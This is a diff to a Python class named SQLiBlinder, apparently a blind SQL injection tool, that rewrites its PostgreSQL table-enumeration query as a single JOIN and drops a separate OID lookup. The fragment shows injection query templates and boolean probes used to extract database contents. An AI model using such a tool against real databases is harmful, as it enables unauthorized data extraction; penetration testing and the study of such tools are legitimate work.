@@ -64,8 +64,7 @@ class SQLiBlinder:
 			self.string_char_definition = 'SELECT ASCII(SUBSTRING(%s,%d,1))'
 			self.count_definition = 'SELECT count(*) FROM (SELECT * FROM %s %s)T'
 			self.offset_shift=0
-			self.oid_query = ["cast(oid as text)","pg_catalog.pg_namespace","nspname not in ('pg_catalog', 'pg_toast')"]
-			self.tables_query = ['relname','pg_catalog.pg_class',"relnamespace in (%s) AND relkind IN ('r','') AND pg_catalog.pg_table_is_visible(oid)"]
+			self.tables_query = ['c.relname','pg_catalog.pg_class c LEFT JOIN pg_catalog.pg_namespace n ON n.oid = c.relnamespace',"c.relkind IN ('r','') AND n.nspname NOT IN ('pg_catalog', 'pg_toast') AND pg_catalog.pg_table_is_visible(c.oid)"]
 
 	def check(self):
 		if self.request_func('1=1') == True:
@@ -208,15 +207,6 @@ class SQLiBlinder:
 			return 'dbms not supported'
 
 	def get_tables(self):
-		if self.dbms == 'postgre':
-			column,table,where = self.oid_query
-			oids = self.get([column],table,where=where)
-			oids = [x[0] for x in oids]
-			print ('oids: ', oids)
-
-			column,table,where = self.tables_query
-			where = where %(','.join(oids))
-			return self.get([column],table,where=where)
 		if hasattr(self,'tables_query'):
 			column,table,where = self.tables_query
 
